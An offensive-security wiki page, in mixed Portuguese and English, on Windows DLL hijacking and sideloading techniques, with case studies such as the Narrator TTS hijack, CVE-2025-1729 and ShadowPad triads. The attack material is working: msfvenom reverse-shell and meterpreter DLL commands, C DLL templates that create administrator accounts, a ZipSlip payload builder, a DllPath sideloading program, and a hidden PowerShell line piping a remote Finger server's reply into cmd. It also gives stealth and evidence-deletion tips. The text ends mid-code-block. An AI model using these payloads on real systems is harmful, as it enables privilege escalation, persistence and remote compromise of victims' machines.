# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking envolve manipular uma aplicação confiável para carregar uma DLL maliciosa. Esse termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para execução de código, obtenção de persistência e, com menos frequência, escalada de privilégios. Apesar do foco em escalation aqui, o método de hijacking permanece consistente entre os objetivos.

### Common Techniques

Vários métodos são empregados para DLL hijacking, cada um com sua eficácia dependendo da estratégia de carregamento de DLL da aplicação:

1. **DLL Replacement**: Trocar uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade original da DLL.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca antes da legítima, explorando o padrão de busca da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para a aplicação carregar, acreditando que ela é uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma equivalente maliciosa no diretório WinSxS, um método frequentemente associado a DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, lembrando técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

O classic DLL sideloading não é a única forma de fazer um processo confiável **.NET Framework** carregar código do atacante. Se o executável alvo for uma aplicação **managed**, o CLR também consulta um **application configuration file** com o mesmo nome do executável (por exemplo `Setup.exe.config`). Esse arquivo pode definir um **AppDomainManager** customizado. Se o config apontar para um assembly controlado pelo atacante colocado ao lado do EXE, o CLR o carrega **antes do caminho normal de código da aplicação** e o executa dentro do processo confiável.

De acordo com o schema de configuração do .NET Framework da Microsoft, tanto `<appDomainManagerAssembly>` quanto `<appDomainManagerType>` devem estar presentes para que o gerenciador customizado seja usado.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gestor minimalista:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas práticas:
- Esta é uma técnica específica de **.NET Framework**. Ela depende do parsing de config do CLR, não da ordem de busca de DLL do Win32.
- O host precisa realmente ser um **managed EXE**. Triagem rápida: `sigcheck -m target.exe`, `corflags target.exe`, ou verifique o **CLR Runtime Header** nos metadados PE.
- O nome do arquivo de config deve corresponder exatamente ao nome do executável (`<binary>.config`) e normalmente fica **ao lado do EXE**.
- Isso é útil com **signed Microsoft/vendor binaries** porque o EXE confiável permanece intacto enquanto o assembly managed malicioso é executado in-process.
- Se você já tiver um diretório de instalador/update gravável, o AppDomainManager hijacking pode ser usado como a **primeira etapa**, seguido por classic DLL sideloading ou reflective loading para as etapas posteriores.

### Hijacking de uma task agendada existente para relançar a cadeia de sideload

Para persistence, não procure apenas por **criação de uma nova task**. Alguns intrusion sets esperam até que um instalador legítimo crie uma **normal updater task** e então **reescrevem a action da task** para que o nome, autor e trigger existentes pareçam familiares para os defenders.

Workflow reutilizável:
1. Instale/execute o software legítimo e identifique a task que ele normalmente cria.
2. Exporte o XML da task e anote os valores atuais de `<Exec><Command>` / `<Arguments>`.
3. Substitua apenas a action para que a task inicie o seu **trusted host EXE** a partir de um diretório de staging gravável pelo usuário, que então faz sideload ou AppDomain-load do payload real.
4. Re-registre o mesmo nome de task em vez de criar um novo artefato óbvio de persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por que é mais stealthier:
- O nome da tarefa ainda pode parecer legítimo (por exemplo, um vendor updater).
- O **Task Scheduler service** a inicia, então a validação de parent/ancestor muitas vezes vê a cadeia de agendamento esperada em vez de `explorer.exe`.
- Equipes de DFIR que só caçam **novos task names** podem perder uma task cuja registration já existia, mas cujo action agora aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou outro path controlado pelo attacker.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

and just show the **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" `<exec name>`, execute it, and stop capturing events**.

## Exploiting Missing Dlls

In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entregue o archive para a watched inbox/share; quando o scheduled task relançar o processo, ele carrega o malicious DLL e executa seu código como a service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar de maneira determinística o DLL search path de um novo processo criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o process com as ntdll native APIs. Ao fornecer aqui um directory controlado pelo attacker, um target process que resolva uma imported DLL por nome (sem absolute path e sem usar as safe loading flags) pode ser forçado a carregar um malicious DLL desse directory.

Key idea
- Build o process parameters com RtlCreateProcessParametersEx e forneça um custom DllPath que aponte para sua pasta controlada (por exemplo, o directory onde seu dropper/unpacker vive).
- Crie o process com RtlCreateUserProcess. Quando o target binary resolver uma DLL por nome, o loader consultará esse DllPath fornecido durante a resolução, permitindo sideloading confiável mesmo quando o malicious DLL não estiver no mesmo local que o target EXE.

Notes/limitations
- Isso afeta o child process sendo criado; é diferente de SetDllDirectory, que afeta apenas o current process.
- O target deve importar ou LoadLibrary uma DLL por nome (sem absolute path e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e hardcoded absolute paths não podem ser hijacked. Forwarded exports e SxS podem alterar a precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque uma xmllite.dll maliciosa (exportando as funções necessárias ou fazendo proxy para a real) no seu diretório DllPath.
- Inicie um binary assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve o import via o DllPath fornecido e faz sideload da sua DLL.

Esta técnica foi observada in-the-wild para conduzir cadeias multi-stage de sideloading: um launcher inicial solta uma helper DLL, que então inicia um binary assinado pela Microsoft, passível de hijack, com um DllPath customizado para forçar o carregamento da DLL do atacante a partir de um diretório de staging.


#### Exceptions on dll search order from Windows docs

Certas exceções à ordem padrão de busca de DLL são mencionadas na documentação do Windows:

- Quando uma **DLL que compartilha o mesmo nome de uma já carregada na memória** é encontrada, o sistema contorna a busca usual. Em vez disso, ele realiza uma verificação de redirection e um manifest antes de recorrer à DLL já carregada na memória. **Nesse cenário, o sistema não faz uma busca pela DLL**.
- Nos casos em que a DLL é reconhecida como uma **known DLL** para a versão atual do Windows, o sistema usará sua versão da known DLL, junto com quaisquer DLLs dependentes, **dispensando o processo de busca**. A chave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas known DLLs.
- Se uma **DLL tiver dependências**, a busca por essas DLLs dependentes é feita como se elas tivessem sido indicadas apenas por seus **module names**, independentemente de a DLL inicial ter sido identificada por um full path.

### Escalating Privileges

**Requisitos**:

- Identificar um processo que opere ou vá operar sob **different privileges** (horizontal ou lateral movement), que esteja **sem uma DLL**.
- Garantir que exista **write access** em qualquer **directory** no qual a **DLL** será **procurada**. Essa localização pode ser o diretório do executável ou um diretório dentro do system path.

Sim, os requisitos são complicados de encontrar porque, **por padrão, é meio estranho encontrar um executável privilegiado sem uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do system path** (você não consegue por padrão). Mas, em ambientes mal configurados, isso é possível.\
Se você tiver sorte e encontrar um caso que atenda aos requisitos, você pode conferir o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja bypass UAC**, você pode encontrar ali um **PoC** de um Dll hijaking para a versão do Windows que pode usar (provavelmente apenas alterando o path da pasta onde você tem permissões de escrita).

Observe que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de um dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo de como **abuse Dll Hijacking to escalate privileges** com permissões para escrever em uma pasta do **System Path** confira:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificará se você tem permissões de escrita em qualquer pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as funções do **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Example

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável importará dela**. De qualquer forma, observe que Dll Hijacking é útil para [escalar de Medium Integrity level para High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo de dll hijacking focado em execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos básicos de dll** que podem ser úteis como **templates** ou para criar uma **dll com funções não necessárias exportadas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basicamente um **Dll proxy** é uma Dll capaz de **execute your malicious code when loaded** mas também de **expose** e **work** como **exected** ao **repassar todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) você pode realmente **indicar um executável e selecionar a biblioteca** que quer proxify e **gerar uma dll proxificada** ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Observe que, em vários casos, a Dll que você compila deve **exportar várias funções** que vão ser carregadas pelo processo vítima; se essas funções não existirem, o **binário não conseguirá carregá-las** e o **exploit falhará**.

<details>
<summary>Modelo de C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de Caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ainda verifica uma DLL de localization previsível e específica de idioma na inicialização, que pode ser hijacked para arbitrary code execution e persistence.

Fatos principais
- Caminho de verificação (builds atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (builds antigos): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se existir uma DLL gravável controlada pelo attacker no caminho OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` é executado. Nenhum export é necessário.

Discovery com Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregar o caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Um hijack ingênuo vai falar/destacar a UI. Para permanecer silencioso, ao anexar enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e use `SuspendThread` nela; continue em sua própria thread. Veja o PoC para o código completo.

Trigger and persistence via Accessibility configuration
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o acima, iniciar o Narrator carrega a DLL implantada. No secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL executa como SYSTEM no secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Permita a classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Faça RDP para o host; na tela de logon, pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL executa como SYSTEM no secure desktop.
- A execução para quando a sessão RDP é encerrada—injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registry de um Accessibility Tool (AT) embutido (por exemplo, CursorIndicator), editá-la para apontar para um binary/DLL arbitrário, importá-la e depois definir `configuration` para esse nome de AT. Isso faz proxy de execução arbitrária sob o framework de Accessibility.

Notes
- Escrever em `%windir%\System32` e alterar valores de HKLM requer privilégios de admin.
- Toda a lógica do payload pode viver em `DLL_PROCESS_ATTACH`; nenhum export é necessário.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), identificado como **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` executa diariamente às 9:30 AM sob o contexto do usuário logado.
- **Directory Permissions**: Gravável por `CREATOR OWNER`, permitindo que usuários locais gravem arquivos arbitrários.
- **DLL Search Behavior**: Tenta carregar `hostfxr.dll` primeiro do seu diretório de trabalho e registra "NAME NOT FOUND" se estiver ausente, indicando precedência de busca no diretório local.

### Exploit Implementation

Um atacante pode colocar um stub malicioso de `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter execução de código sob o contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada ser executada às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver logado quando a tarefa executar, a DLL maliciosa será executada na sessão do administrador com medium integrity.
4. Encadeie técnicas padrão de UAC bypass para elevar de medium integrity para privilégios SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.

Visão geral da cadeia
- O usuário baixa o MSI. Um CustomAction é executado silenciosamente durante a instalação GUI (por exemplo, LaunchApplication ou uma ação VBScript), reconstruindo a próxima etapa a partir de recursos embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (exemplo de par: wsc_proxy.exe assinado pela Avast + wsc.dll controlado pelo attacker).
- Quando o EXE assinado é iniciado, a ordem de busca de DLLs do Windows carrega wsc.dll do diretório de trabalho primeiro, executando o código do attacker sob um processo pai assinado (ATT&CK T1574.001).

Análise do MSI (o que procurar)
- Tabela CustomAction:
- Procure entradas que executem executables ou VBScript. Exemplo de padrão suspeito: LaunchApplication executando um arquivo embutido em background.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Payloads embutidos/divididos no CAB do MSI:
- Extração administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou use lessmsi: lessmsi x package.msi C:\out
- Procure vários fragmentos pequenos que são concatenados e descriptografados por um VBScript CustomAction. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: DLL do atacante. Se nenhum export específico for necessário, DllMain pode ser suficiente; caso contrário, construa uma proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de export, use um proxying framework (por exemplo, DLLirant/Spartacus) para gerar uma forwarding DLL que também execute seu payload.

- Esta técnica depende da resolução do nome da DLL pelo host binary. Se o host usar absolute paths ou safe loading flags (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS e forwarded exports podem influenciar a precedence e devem ser considerados ao selecionar o host binary e o export set.

## Signed triads + encrypted payloads (ShadowPad case study)

A Check Point descreveu como a Ink Dragon implanta ShadowPad usando uma **three-file triad** para se misturar a software legítimo enquanto mantém o core payload encrypted em disco:

1. **Signed host EXE** – vendors como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um Windows binary (por exemplo `conhost.exe`), mas a Authenticode signature permanece válida.
2. **Malicious loader DLL** – colocada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um MFC binary ofuscado com o framework ScatterBrain; sua única função é localizar o encrypted blob, decrypt it e mapear o ShadowPad de forma reflective.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Após memory-mapping o decrypted payload, o loader deleta o arquivo TMP para destruir forensic evidence.

Tradecraft notes:

* Renomear o signed EXE (mantendo o `OriginalFileName` original no PE header) permite que ele se passe por um Windows binary e ainda retenha a vendor signature, então replique o hábito da Ink Dragon de soltar binaries com aparência de `conhost.exe` que na verdade são utilitários AMD/NVIDIA.
* Como o executável continua trusted, a maioria dos allowlisting controls só precisa que sua malicious DLL fique ao lado dele. Foque em customizar a loader DLL; o signed parent normalmente pode rodar sem alterações.
* O decryptor do ShadowPad espera que o TMP blob esteja ao lado do loader e seja writable para poder zerar o arquivo após o mapping. Mantenha o diretório writable até o payload carregar; uma vez em memória, o arquivo TMP pode ser apagado com segurança para OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Os operadores combinam DLL sideloading com LOLBAS para que o único artefato customizado em disco seja a malicious DLL ao lado do trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell inicia `cmd.exe /c`, busca comandos de um Finger server e os envia para `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` busca TCP/79 text; `| cmd` executa a resposta do server, permitindo que os operadores rotacionem o second stage no lado do server.

- **Built-in download/extract:** Baixe um archive com uma extensão benign, descompacte-o e prepare o sideload target junto com a DLL em uma pasta aleatória de `%LocalAppData%`:

```powershell
